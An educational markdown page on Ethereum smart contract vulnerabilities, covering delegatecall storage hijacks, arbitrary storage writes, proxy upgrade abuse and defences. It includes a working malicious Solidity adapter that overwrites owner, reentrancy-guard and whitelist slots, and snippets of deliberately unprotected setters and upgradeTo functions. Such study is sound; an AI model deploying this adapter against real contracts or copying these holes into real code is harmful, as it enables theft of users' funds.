# Typical Security Vulnerabilities
A living knowledge base of common security issues and low-level quirks in Ethereum smart contract development. Includes real-world examples, attack patterns (like delegatecall-based ownership hijacks), and practical tooling for safe development and auditing workflows. *This document will be updated as I discover new exploits, patterns, or low-level tricks.*

---

## Ethereum Addresses Checksum
Ethereum itself (the EVM) is **not case sensitive** when it comes to addresses — you can use all lowercase addresses just fine. However, some front-end apps like **MetaMask** or **Etherscan** use a **mixed-case version** of the address for added safety. This is based on **EIP-55**, which defines a **checksum mechanism** using uppercase/lowercase letters to help catch typos.

So if you see an address like `0xF39Fd6e51aad88F6F4ce6aB8827279cffFb92266`, know that the uppercase letters are part of this checksum. You can still use the all-lowercase version — it’ll work in most tools — but mixed-case is preferred when available.

You can validate or convert an address to its checksummed version using Foundry’s `cast checksum` command:

```bash
cast to-check-sum-address 0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266
```

:round_pushpin: Output:

```
0xF39Fd6e51aad88F6F4ce6aB8827279cffFb92266
```

This helps ensure the address is typed correctly — a small but useful tool for safer Ethereum development.

---

## 🧨 Delegatecall-Based Ownership Hijack

> Posted by @abhinabphy on 14.07.2025 in
> 🔥⚔🛡 ‹𝔽𝕠𝕦𝕟𝕕𝕣𝕪 & 𝔽𝕦𝕣𝕪› 🛡⚔🔥,  
> a Discord server dedicated to studying smart contract security and auditing.

This is a typical example of a **delegatecall vulnerability**, where a malicious contract abuses low-level storage writes to hijack ownership and bypass access controls.

### 🔓 `MaliciousAdapter.sol`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

interface IAdapter {
    function executeSimpleSwap(
        address fromToken,
        address toToken,
        uint256 fromTokenAmount,
        bytes calldata data
    ) external payable;
}

contract MaliciousAdapter is IAdapter {
    function executeSimpleSwap(
        address, address, uint256, bytes calldata
    ) external payable override {
        assembly {
            // Unlock reentrancyGuard
            sstore(1, 0)

            // Overwrite owner slot (slot 0) with attacker's address
            sstore(0, 0x123)

            // Whitelist this adapter using known storage layout
            mstore(0x00, address())
            mstore(0x20, 2) // key for mapping: keccak256(address . 2)
            let slot := keccak256(0x00, 0x40)
            sstore(slot, 1)

            return(0, 0)
        }
    }

    receive() external payable {}
}
```

### 🧠 Key Takeaways:

* This exploits assumptions about storage layout (e.g., that `owner` is at slot `0`, etc.).
* These assumptions become dangerous when `delegatecall` is used to an **untrusted adapter**.
* Critical mappings and modifiers like `onlyOwner`, `reentrancyGuard`, or `whitelisted` can be **trivially bypassed** if storage alignment isn't protected.

---

## The "holy grail" of most smart contract attacks

The **"holy grail" of most smart contract attacks** — the **direct arbitrary storage write primitive** — refers to an attacker's ability to **write arbitrary values to arbitrary storage slots** in a contract.

---

### 🧨 Why is it so dangerous?

Because **everything** in a Solidity smart contract — variables, mappings, arrays, permissions, balances — is ultimately stored in deterministic **storage slots**. If an attacker can write to *any* slot, they can:

* Overwrite the `owner` or `admin` address
* Give themselves `balances` in a token contract
* Disable security checks
* Re-enable a self-destructed proxy
* Point a proxy to a malicious implementation
* Nullify `onlyOwner` or `require` logic

---

### 💣 How does it happen?

Usually **indirectly**, due to one of these vulnerabilities:

#### 1. **Uninitialized `delegatecall` proxies**

* `delegatecall` executes code in the *context* of the calling contract (same `storage`).
* If the proxy or logic contract has an uninitialized variable like `address implementation;`, and the attacker can call an `initialize()` function…
* ...they can point the logic contract to their own malicious implementation, and then overwrite any slot via delegatecalls.

**Classic case:** [Parity Wallet hack (2017)](https://www.parity.io/security-alert-2/)

---

#### 2. **Incorrect `selfdestruct` or upgrade logic**

If a proxy pattern allows unrestricted access to an upgrade function (e.g. `upgradeTo()`), attacker can:

* Replace logic contract with a malicious one
* Call arbitrary logic that writes to storage via `delegatecall`

---

#### 3. **Storage collision**

If a `delegatecall` target and the calling contract use the **same storage slots for different variables**, then:

* Attacker can trick the calling contract into writing to sensitive variables, like `owner`, by manipulating data in the logic contract.

---

#### 4. **Unsafe `assembly` or `storage pointers`**

Using inline assembly (`sstore`, `sload`) or incorrectly written storage references (e.g. reusing `storage` pointers carelessly) can allow overwriting unintended slots.

---

#### 5. **Improperly protected `setters`**

If a function like:

```solidity
function setSomething(bytes32 slot, uint value) public {
    assembly {
        sstore(slot, value)
    }
}
```

...is publicly accessible, it's *game over*.

---

### 🧠 Real World Summary

A **direct arbitrary storage write primitive** means:

> The attacker can act as the compiler. They can do `sstore(0x123, 0xdeadbeef)` — write whatever they want, wherever they want.

That’s why smart contract developers and auditors **panic** when they see:

* `delegatecall` usage
* upgradeable proxies with `initialize()` still callable
* storage collisions

---

### 🔐 Defense Strategy

1. **Always initialize storage in constructors or protected functions.**
2. **Never expose `delegatecall` without access control.**
3. **Use OpenZeppelin’s upgradeable proxy contracts, not custom ones.**
4. **Use `audit` tooling and static analyzers** like:

   * Slither
   * MythX
   * Echidna
   * Foundry’s `forge fuzz`

---

## 🔁 What is a Proxy?

Great question — let’s dive into **what a proxy is in Solidity**, and then explain in detail the **two ways attackers can exploit them**:

In smart contracts, a **proxy** is a **design pattern** where:

* You **separate contract logic** from **contract data**.
* The proxy holds the **data (storage)**.
* It forwards all function calls to an **implementation (logic) contract** via `delegatecall`.

### Why?

Because **you can't modify deployed code on-chain**, but with a proxy:

* You can **upgrade logic** by changing the pointer to a new implementation.
* The proxy **stays at the same address**, retaining all its state and balance.

---

### 🧱 How it works

1. Proxy has a `fallback()` or `receive()` function.
2. It uses `delegatecall` to forward the call to the current implementation.
3. `delegatecall` runs the code of the logic contract **in the context of the proxy's storage**.

```solidity
fallback() external payable {
    address impl = implementation;
    assembly {
        calldatacopy(0, 0, calldatasize())
        let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
        returndatacopy(0, 0, returndatasize())
        switch result
        case 0 { revert(0, returndatasize()) }
        default { return(0, returndatasize()) }
    }
}
```

---

### ⚠️ How attackers exploit proxies

#### 1. 🔥 Re-enable a self-destructed proxy

Some poorly designed upgradeable contracts use logic contracts with a **`selfdestruct()`** function still callable (e.g., unprotected).

An attacker can:

* Find the implementation address (it's usually stored in a standard slot like `0x360894A13BA1A3210667C828492DB98DCA3E2076CC3735A920A3CA505D382BBC`).
* Call a **function that triggers `selfdestruct`** in the logic contract.
* This destroys the code of the logic contract.

##### But it gets worse:

* If there's **no version protection**, or if the `initialize()` function is still callable (and unguarded), the attacker can:

  * **Deploy a malicious logic contract**
  * **Point the proxy to it**
  * The proxy now **reanimates** with new malicious logic.
  * The proxy’s state (storage, ETH) is still intact — now vulnerable.

---

#### 2. 🎭 Point a proxy to a malicious implementation

If the contract has an unprotected or badly protected **`upgradeTo()`** function like:

```solidity
function upgradeTo(address newImplementation) public {
    implementation = newImplementation;
}
```

...an attacker can just call it and:

* Replace the trusted logic contract with their **own** logic contract (which may have e.g. `selfdestruct()`, or a backdoor).
* Then call malicious functions via the proxy.

##### Typical attack flow:

1. Attacker calls `upgradeTo(attackerContract)`.
2. Then calls `proxyContract.someFunction(...)`.
3. This delegates to the attacker’s logic contract, but writes to the proxy’s state.

Result: **the proxy works for the attacker** now.

---

### 💣 Real-World Example

* **Parity Multisig Hack (2017)**: Anyone could call `kill()` because the contract wasn’t properly initialized. A user killed a contract holding **hundreds of thousands of ETH**.

* **Upgradeable ERC20s (badly written)**: If `upgradeTo()` is public or if `initializer()` can be called more than once, the attacker **can overwrite ownership, logic, and storage**.

---

### 🔐 Takeaway for Developers

* Always **protect `initialize()`** with `initializer` modifier or `require(initialized == false)`.
* Never leave `upgradeTo()` public.
* Prefer hardened, audited proxy patterns (like from **OpenZeppelin Upgrades**).
* Use **constructor** in logic contracts to set `implementation`, and **avoid storage collisions**.

---

You're referring to the `delegatecall` command — a low-level EVM instruction that’s **very powerful** but also **very dangerous** if used incorrectly.

---

## 🧨 What `delegatecall` Does

```solidity
(bool success, bytes memory result) = target.delegatecall(data);
```

This means:

* Call the **code at `target` address**
* BUT **execute that code in the context of the calling contract**

  * **Storage** used will be from the **calling contract**
  * **`msg.sender` and `msg.value`** stay the same
  * The **code** is taken from the `target`

---

### ✅ Use Case: Upgradeable Proxies

`delegatecall` is **essential** for implementing **upgradeable contracts**, because:

* The **proxy contract** keeps all the state
* The **logic/implementation contract** can be replaced
* The call is forwarded using `delegatecall` to keep the state intact

Example:

```solidity
address implementation = 0xABC;
implementation.delegatecall(msg.data);
```

This is **how proxies work** — the core trick.

---

### ❌ Why It’s Dangerous

1. **Runs foreign code** in your contract’s context
2. Can **overwrite your storage** in unexpected ways
3. Used improperly, it lets **attackers gain control** of the contract
4. If `delegatecall` target is **self-destructed**, the call fails or is unpredictable
5. If `delegatecall` target is **malicious**, it can:

   * Steal funds
   * Destroy or corrupt state
   * Escalate privileges

---

### 🛑 Must It Be Avoided?

No — but it must be:

* **Heavily guarded**
* Used with **extreme caution**
* Preferred through **battle-tested patterns** (like OpenZeppelin’s `TransparentUpgradeableProxy`)
* Never expose `delegatecall` endpoints to **arbitrary user input**

---

#### 🔒 Safe Practices

* Don’t let anyone pass arbitrary `target` addresses to `delegatecall`.
* Only use `delegatecall` in **proxy contracts** with fixed logic contract addresses (or tightly controlled upgrade logic).
* Avoid `delegatecall` entirely unless you are building something upgradeable — and even then, **use audited libraries**.

---

### For further nuisanses on delegatecall and it's comparison with interfaces, please proceed to the solidity-architecture-and-coding-conventions.md file :)



